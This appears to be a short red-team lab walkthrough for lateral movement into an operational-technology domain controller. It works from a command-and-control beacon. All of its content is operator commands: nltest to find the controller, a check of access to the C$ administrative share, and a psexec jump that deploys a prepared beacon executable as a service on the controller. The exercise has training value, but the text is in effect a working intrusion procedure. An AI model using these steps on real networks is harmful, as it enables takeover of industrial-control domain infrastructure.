- Use the OT engineering-station beacon with the lab account. Identify the domain controller with <code>powershell nltest /dsgetdc:$( (Get-CimInstance Win32_ComputerSystem).Domain )</code>.
- Confirm the session can reach its administrative share with <code>dir \\DC-OT-01\c$</code>.
- From that same beacon, run <code>jump psexec DC-OT-01 /home/sysadmin/AdaptixProjects/ShadowHackers/DCOThacked.exe</code> to start the prepared service beacon on the OT domain controller.
- Confirm the new session runs on the OT domain controller. Identify the OT domain's short name from the account information, then form the controller's computer account as <code>DOMAIN\HOSTNAME$</code>. The machine account is different from the local <code>SYSTEM</code> process identity.
